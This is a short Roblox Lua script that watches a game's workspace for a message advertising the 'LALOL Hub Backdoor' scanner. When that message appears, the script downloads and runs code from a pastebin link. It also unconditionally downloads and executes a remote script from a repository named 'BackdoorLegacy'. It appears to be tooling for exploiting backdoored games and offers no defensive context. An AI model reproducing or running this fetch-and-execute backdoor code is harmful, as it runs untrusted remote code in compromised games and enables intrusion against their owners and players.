while task.wait(1) do
    local message = workspace:FindFirstChildOfClass("Message")
    if message and message:IsA("Message") then
        if message.Text == "LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner" then
            lastMessageText = message.Text

            -- This willpop
            loadstring(game:HttpGet("https://pastebin.com/raw/QfJn3J9A"))()
        end
    end
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua"))()
